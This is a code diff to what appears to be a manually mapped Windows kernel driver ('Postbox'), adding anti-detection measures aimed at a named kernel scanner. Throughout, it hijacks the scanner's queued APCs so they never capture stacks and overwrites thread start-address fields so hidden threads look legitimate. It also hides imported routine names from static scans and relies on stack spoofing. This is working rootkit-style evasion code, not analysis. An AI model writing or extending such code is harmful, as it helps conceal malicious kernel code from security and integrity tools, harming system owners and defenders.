@@ -65,6 +65,8 @@ using FnPsGetProcessCreateTimeQuadPart = int64_t (*)(void*);
 using FnPsGetCurrentProcess = void* (*)();
 using FnExAllocatePoolWithTag = void* (*)(uint32_t, size_t, uint32_t);
 using FnExFreePool = void (*)(void*);
+using FnKeEnterCriticalRegion = void (*)();
+using FnKeLeaveCriticalRegion = void (*)();
 using FnMmAllocateIndependentPages = void* (*)(size_t Size, uint32_t Arg2,
                                                uint32_t Arg3, uint32_t Arg4);
 using FnMmSetPageProtection = uint8_t (*)(void* Addr, size_t Size, uint32_t Protect);
@@ -84,6 +86,7 @@ using FnMmCopyVirtualMemory = int32_t (*)(void* SourceProcess, void* SourceAddre
                                           void* TargetProcess, void* TargetAddress,
                                           size_t Size, int32_t PreviousMode, size_t* Done);
 using FnKeIpiGenericCall = uint64_t (*)(uint64_t (*)(uint64_t), uint64_t);
+using FnPsLookupThreadByThreadId = int32_t (*)(void* ThreadId, void** Thread);
 using FnPsCreateSystemThread = int32_t (*)(void** ThreadHandle, uint32_t DesiredAccess,
                                            void* ObjectAttributes, void* ProcessHandle,
                                            void* ClientId, void* StartRoutine,
@@ -120,6 +123,7 @@ static address g_MmCopyMemory = 0;
 static address g_MmCopyVirtualMemory_Raw = 0;
 static address g_PsCreateSystemThread_Raw = 0;
 static address g_ZwClose_Raw = 0;
+static address g_PsLookupThreadByThreadId_Raw = 0;
 
 static volatile long PostboxRunning = 0;
 // Cleared by the assembly worker wrapper after PostboxWorkRoutine returns, so
@@ -181,7 +185,16 @@ struct PostboxImports
     // enable them only for the clean wait.
     address KeEnterCriticalRegion;
     address KeLeaveCriticalRegion;
+    address PsLookupThreadByThreadId;
 };
+
+struct PostboxClientId
+{
+    void* UniqueProcess;
+    void* UniqueThread;
+};
+
+static void PostboxSpoofThreadStart(void* ThreadId);
 
 // NMI-gate imports. Kept in the state page so the NMI build's .data does not
 // carry eight ntoskrnl routine pointers. PostboxNmiInstall runs after the state
@@ -274,6 +287,8 @@ struct PostboxNmiSanitizeState
     // Test-only evidence block for the pb_nmi_status command. Not in the
     // shipped layout (NMI_PROBE is off in the product).
     uint64_t Writes;
+    uint64_t ApcNeutralized;
+    uint64_t ThreadStartSpoofed;
     uint64_t LastCount;
     uint64_t LastUser;
     uint64_t LastCore;
@@ -398,6 +413,7 @@ PostboxMemCaches* PostboxGetMemCaches()
 #define g_MmFreeIndependentPages (PostboxStatePtr->Imports.MmFreeIndependentPages)
 #define g_KeEnterCriticalRegion (PostboxStatePtr->Imports.KeEnterCriticalRegion)
 #define g_KeLeaveCriticalRegion (PostboxStatePtr->Imports.KeLeaveCriticalRegion)
+#define g_PsLookupThreadByThreadId (PostboxStatePtr->Imports.PsLookupThreadByThreadId)
 
 #ifdef STACK_SPOOF
 // Defined with the stack-spoof assembly and globals below; forward-declared for
@@ -1047,6 +1063,81 @@ static void PostboxNmiFindDetector(PostboxState* S)
     }
 }
 
+// APC stackwalk countermeasure. unKOver's scanner queues a normal kernel APC
+// (KernelRoutine = UkCaptureStackAPC inside Unkover.sys) to every system thread
+// and captures RtlCaptureStackBackTrace from the APC. Our mapped threads keep
+// kernel APCs disabled while they run mapped code, so the APC stays queued;
+// before the region is left this patch redirects the detector's KernelRoutine
+// to the neutralizer below. The neutralizer frees the KAPC and suppresses the
+// normal routine, so the detector's event is never signaled and no stack is
+// captured. Only KAPCs whose KernelRoutine lies inside the detector image are
+// touched; other kernel APCs are left alone.
+extern "C" void PostboxApcNeutralRoutine(void* Apc, void** NormalRoutine,
+                                         void** NormalContext,
+                                         void** SystemArgument1,
+                                         void** SystemArgument2)
+{
+    (void) NormalContext;
+    (void) SystemArgument1;
+    (void) SystemArgument2;
+    if (NormalRoutine) *NormalRoutine = nullptr;
+    auto* S = PostboxStatePtr;
+    if (S && S->Imports.ExFreePool)
+        ((FnExFreePool) (uintptr_t) S->Imports.ExFreePool)(Apc);
+}
+
+extern "C" void PostboxNeutralizeDetectorApcs()
+{
+    auto* S = PostboxStatePtr;
+    if (!S) return;
+    if (!S->NmiSanitize.DetectorBase || !S->NmiSanitize.DetectorSize)
+        PostboxNmiFindDetector(S);
+    const uint64_t Base = S->NmiSanitize.DetectorBase;
+    const uint64_t Size = S->NmiSanitize.DetectorSize;
+    if (!Base || !Size) return;
+
+    // Current KTHREAD from KPCR; 19041 layout: KTHREAD+0x98 = ApcState,
+    // ApcListHead[KernelMode] = +0x00, KAPC.ApcListEntry = +0x10,
+    // KAPC.KernelRoutine = +0x20.
+    const uint64_t Kpcr = __readmsr(0xC0000101);
+    auto* Thread = *(uint8_t**) (uintptr_t) (Kpcr + 0x188);
+    if (!Thread) return;
+    auto* Head = (_LIST_ENTRY*) (uintptr_t) (Thread + 0x98);
+    auto* Entry = Head->Flink;
+    for (uint32_t i = 0; i < 64 && Entry && Entry != Head; ++i)
+    {
+        auto* Next = Entry->Flink;
+        auto* Apc = (uint8_t*) (uintptr_t) Entry - 0x10;
+        const uint64_t KernelRoutine = *(const uint64_t*) (Apc + 0x20);
+        if (KernelRoutine >= Base && KernelRoutine < Base + Size)
+        {
+            *(uint64_t*) (Apc + 0x20) =
+                (uint64_t) (uintptr_t) &PostboxApcNeutralRoutine;
+#ifdef NMI_PROBE
+            __atomic_add_fetch(&S->NmiSanitize.ApcNeutralized, 1,
+                               __ATOMIC_ACQ_REL);
+#endif
+        }
+        Entry = Next;
+    }
+}
+
+extern "C" void PostboxApcsDisable();
+extern "C" void PostboxApcsDisable()
+{
+    auto* S = PostboxStatePtr;
+    if (S && S->Imports.KeEnterCriticalRegion)
+        ((FnKeEnterCriticalRegion) (uintptr_t) S->Imports.KeEnterCriticalRegion)();
+}
+
+extern "C" void PostboxApcsNeutralizeAndEnable()
+{
+    PostboxNeutralizeDetectorApcs();
+    auto* S = PostboxStatePtr;
+    if (S && S->Imports.KeLeaveCriticalRegion)
+        ((FnKeLeaveCriticalRegion) (uintptr_t) S->Imports.KeLeaveCriticalRegion)();
+}
+
 // Resolve the loaded module that owns Address. Used by the callback-property
 // detector match below, so a renamed detector still yields a valid range.
 static bool PostboxNmiModuleForAddress(PostboxState* S, uint64_t Address,
@@ -1579,12 +1670,16 @@ static void PostboxNmiMonitorThread(void* Context)
 {
     auto* S = (PostboxState*) Context;
     if (!S) return;
+    PostboxApcsDisable();
     while (PostboxNmiMonitorStep(S))
     {
+        PostboxNeutralizeDetectorApcs();
         _LARGE_INTEGER Delay{};
         Delay.QuadPart = -10000;      // 1 ms
         PostboxDelayExecutionThread(0, 0, &Delay);
     }
+    PostboxNeutralizeDetectorApcs();
+    PostboxApcsNeutralizeAndEnable();
 }
 
 #endif
@@ -1653,10 +1748,14 @@ static bool PostboxNmiTryActivate(PostboxState* S)
                 StartContext = &S->MonitorLoop;
             }
 #endif
+            PostboxClientId Cid{};
             if (((FnPsCreateSystemThread) g_PsCreateSystemThread)(
-                    &ThreadHandle, 0x1FFFFF, nullptr, nullptr, nullptr,
+                    &ThreadHandle, 0x1FFFFF, nullptr, nullptr, &Cid,
                     Start, StartContext) >= 0 && ThreadHandle)
+            {
+                PostboxSpoofThreadStart(Cid.UniqueThread);
                 ((FnZwClose) g_ZwClose)(ThreadHandle);
+            }
 #endif
             return true;
         }
@@ -1695,12 +1794,16 @@ static void PostboxNmiRefreshThread(void* Context)
 {
     auto* S = (PostboxState*) Context;
     if (!S) return;
+    PostboxApcsDisable();
     while (PostboxNmiRefreshStep(S))
     {
+        PostboxNeutralizeDetectorApcs();
         _LARGE_INTEGER Delay{};
         Delay.QuadPart = -100 * 10000;      // 1 s
         PostboxDelayExecutionThread(0, 0, &Delay);
     }
+    PostboxNeutralizeDetectorApcs();
+    PostboxApcsNeutralizeAndEnable();
     __atomic_store_n(&S->NmiSanitize.RefreshThreadActive, 0, __ATOMIC_RELEASE);
 }
 
@@ -1724,10 +1827,12 @@ static bool PostboxNmiStartRefreshThread(PostboxState* S)
         StartContext = &S->RefreshLoop;
     }
 #endif
+    PostboxClientId Cid{};
     if (((FnPsCreateSystemThread) g_PsCreateSystemThread)(
-            &ThreadHandle, 0x1FFFFF, nullptr, nullptr, nullptr,
+            &ThreadHandle, 0x1FFFFF, nullptr, nullptr, &Cid,
             Start, StartContext) >= 0 && ThreadHandle)
     {
+        PostboxSpoofThreadStart(Cid.UniqueThread);
         ((FnZwClose) g_ZwClose)(ThreadHandle);
         return true;
     }
@@ -1778,6 +1883,7 @@ static bool PostboxNmiSanitizeInit(PostboxState* S, uint64_t ImageBase, uint64_t
     // PostboxStart's later assignment. Publish the gadget first so the APC
     // stackwalk loop is selected on the first activation.
     g_PostboxPopRspRet = N.PopRspRet;
+    g_PostboxPopRspRetSkip = N.PopRspRetSkip;
 #endif
     N.Ready = 1;
     PostboxNmiRefreshDetector(S);
@@ -2033,7 +2139,7 @@ static bool PostboxResolve(address* IpiGenericCallOut)
     // image's .rdata carries neither plaintext nor ROT1-decipherable bytes. This is
     // anti-static-scan, not secrecy: decoded into stack buffers and wiped after the
     // resolve. The resolved pointers remain in .data.
-    constexpr uint32_t ImportCount = 21;
+    constexpr uint32_t ImportCount = 22;
     static constexpr EncodedName EncodedNames[] = {
         EncodeName("KeInitializeTimerEx"),
         EncodeName("KeInitializeDpc"),
@@ -2056,6 +2162,7 @@ static bool PostboxResolve(address* IpiGenericCallOut)
         EncodeName("NtClose"),
         EncodeName("KeEnterCriticalRegion"),
         EncodeName("KeLeaveCriticalRegion"),
+        EncodeName("PsLookupThreadByThreadId"),
     };
     static_assert(sizeof(EncodedNames) / sizeof(EncodedNames[0]) == ImportCount,
                   "import name table changed");
@@ -2105,6 +2212,7 @@ static bool PostboxResolve(address* IpiGenericCallOut)
     g_ZwClose_Raw = Functions[18];
     g_KeEnterCriticalRegion_Raw = Functions[19];
     g_KeLeaveCriticalRegion_Raw = Functions[20];
+    g_PsLookupThreadByThreadId_Raw = Functions[21];
 
     for (uint32_t i = 0; i < ImportCount; ++i)
     {
@@ -2257,9 +2365,10 @@ extern "C" void PostboxDrainThreadApcs(void)
     PostboxDelayExecutionThread(0, 1, &zero);
 }
 
-// Called from PostboxThreadLoop. This uses the same generic shadow-stack
-// trampoline as the worker/DPC calls instead of the separate clean-wait fake
-// stack, whose return chain was not shadow-space safe.
+// Called from PostboxThreadLoop while the loop holds a critical region, so
+// this wait runs with kernel APCs disabled. The APC stackwalk countermeasure
+// neutralizes the detector's queued KAPC before the region is left, so the
+// wait's mapped return address is never captured by an APC.
 extern "C" int32_t PostboxSpoofedThreadWait(int64_t* Interval)
 {
     if (!Interval) return -1;
@@ -2394,6 +2503,28 @@ static int32_t PostboxCreateSystemThread(void** ThreadHandle, uint32_t DesiredAc
     return ((FnPsCreateSystemThread) g_PsCreateSystemThread)(
         ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, ClientId,
         StartRoutine, StartContext);
+}
+
+// SystemThreadScanner reads ThreadQuerySetWin32StartAddress, which is
+// _ETHREAD.Win32StartAddress (19041: +0x4D0). The mapped monitor/refresh/reaper
+// threads are created with a mapped entry point; point the field at an nt
+// routine after creation so the scanner resolves a backed module. Do not touch
+// _ETHREAD.StartAddress (+0x450); that is the kernel startup routine.
+static void PostboxSpoofThreadStart(void* ThreadId)
+{
+    if (!ThreadId || !g_PsLookupThreadByThreadId) return;
+    void* ThreadObj = nullptr;
+    if (((FnPsLookupThreadByThreadId) g_PsLookupThreadByThreadId)(ThreadId, &ThreadObj) < 0 ||
+        !ThreadObj)
+        return;
+    auto* Eth = (uint8_t*) (uintptr_t) ThreadObj;
+    *(uint64_t*) (Eth + 0x4D0) = (uint64_t) (uintptr_t) g_PsCreateSystemThread;
+#ifdef NMI_PROBE
+    if (PostboxStatePtr)
+        __atomic_add_fetch(&PostboxStatePtr->NmiSanitize.ThreadStartSpoofed, 1,
+                           __ATOMIC_ACQ_REL);
+#endif
+    PostboxDereferenceObject(ThreadObj);
 }
 
 static int32_t PostboxCloseHandle(void* Handle)
@@ -2853,6 +2984,10 @@ extern "C" uint64_t PostboxReaperPrepare(PostboxState* State, PostboxReaperPlan*
     if (!DelayThread) return 0;
     for (uint32_t i = 0; i < 1000 && __atomic_load_n(&PostboxInFlight, __ATOMIC_ACQUIRE); ++i)
     {
+        // The reaper is a mapped system thread too. Patch any detector APC that
+        // arrived since the last wait so it is delivered as a neutralizer (no
+        // RtlCaptureStackBackTrace) instead of capturing this mapped stack.
+        PostboxNeutralizeDetectorApcs();
         _LARGE_INTEGER Interval{};
         Interval.QuadPart = -10000;   // 1 ms
         ((FnKeDelayExecutionThread) DelayThread)(0, 0, &Interval);
@@ -2873,9 +3008,15 @@ extern "C" uint64_t PostboxReaperPrepare(PostboxState* State, PostboxReaperPlan*
     // grace period: a late DPC (queued in the cancel/flush race window) must be
     // able to run with a valid DeferredRoutine and import table. Running is
     // already 0, so it returns without re-arming or queueing.
-    _LARGE_INTEGER Delay{};
-    Delay.QuadPart = -5000000;        // 500 ms
-    ((FnKeDelayExecutionThread) DelayThread)(0, 0, &Delay);
+    // 500 ms grace in 10 ms slices: neutralize a detector APC before each wait
+    // so the reaper's mapped stack is never captured at teardown.
+    for (uint32_t i = 0; i < 50; ++i)
+    {
+        PostboxNeutralizeDetectorApcs();
+        _LARGE_INTEGER Delay{};
+        Delay.QuadPart = -100000;     // 10 ms
+        ((FnKeDelayExecutionThread) DelayThread)(0, 0, &Delay);
+    }
 
 #ifdef STACK_SPOOF
     // The worker has returned (PostboxInFlight == 0) and the grace period has
@@ -2930,8 +3071,9 @@ static bool PostboxStartReaper()
     // The reaper frees the state page, so read the close routine into a local
     // before the thread can run. The StartContext is the state page itself.
     void* ThreadHandle = nullptr;
+    PostboxClientId Cid{};
     const int32_t Status = PostboxCreateSystemThread(
-        &ThreadHandle, 0x1FFFFF /* THREAD_ALL_ACCESS */, nullptr, nullptr, nullptr,
+        &ThreadHandle, 0x1FFFFF /* THREAD_ALL_ACCESS */, nullptr, nullptr, &Cid,
         (void*) &PostboxReaperEntry, State);
     if (Status < 0 || !ThreadHandle)
     {
@@ -2939,6 +3081,7 @@ static bool PostboxStartReaper()
         print(ERROR("Postbox: reaper thread creation failed"));
         return false;
     }
+    PostboxSpoofThreadStart(Cid.UniqueThread);
     PostboxCloseHandle(ThreadHandle);
     print(INFO("Postbox: reaper armed"));
     return true;
@@ -3372,6 +3515,8 @@ static void PostboxPollAttached(void* MailboxProcess)
         St.NtBase = PostboxStatePtr->NmiSanitize.NtBase;
         St.NtSize = PostboxStatePtr->NmiSanitize.NtSize;
         St.PsLoadedModuleList = PostboxStatePtr->Caches.PsLoadedModuleList;
+        St.ApcNeutralized = PostboxStatePtr->NmiSanitize.ApcNeutralized;
+        St.ThreadStartSpoofed = PostboxStatePtr->NmiSanitize.ThreadStartSpoofed;
         __builtin_memcpy(PostboxStatePtr->Stage, &St, sizeof(St));
         pb::SealResponseBody(PostboxStatePtr->Stage, sizeof(St),
                              PostboxStatePtr->Keys, PostboxStatePtr->SessionId,
@@ -3656,6 +3801,8 @@ bool PostboxStart(const PostboxConfig* Config)
     PostboxStatePtr->Imports.ZwClose = g_ZwClose_Raw;
     PostboxStatePtr->Imports.KeEnterCriticalRegion = g_KeEnterCriticalRegion_Raw;
     PostboxStatePtr->Imports.KeLeaveCriticalRegion = g_KeLeaveCriticalRegion_Raw;
+    PostboxStatePtr->Imports.PsLookupThreadByThreadId =
+        g_PsLookupThreadByThreadId_Raw;
 
     g_KeInitializeTimerEx_Raw = 0;
     g_KeInitializeDpc_Raw = 0;
@@ -3677,6 +3824,7 @@ bool PostboxStart(const PostboxConfig* Config)
     g_ZwClose_Raw = 0;
     g_KeEnterCriticalRegion_Raw = 0;
     g_KeLeaveCriticalRegion_Raw = 0;
+    g_PsLookupThreadByThreadId_Raw = 0;
 
     // Acquire the client reference and verify its create time once, not per poll.
     // Pid/CreateTime are the last config fields any path reads; keep Pid for the
@@ -4281,6 +4429,7 @@ bool VerifyPostboxResolveNames()
         {"MmFreeIndependentPages", I.MmFreeIndependentPages},
         {"KeEnterCriticalRegion", I.KeEnterCriticalRegion},
         {"KeLeaveCriticalRegion", I.KeLeaveCriticalRegion},
+        {"PsLookupThreadByThreadId", I.PsLookupThreadByThreadId},
     };
     for (const auto& S : Slots)
     {
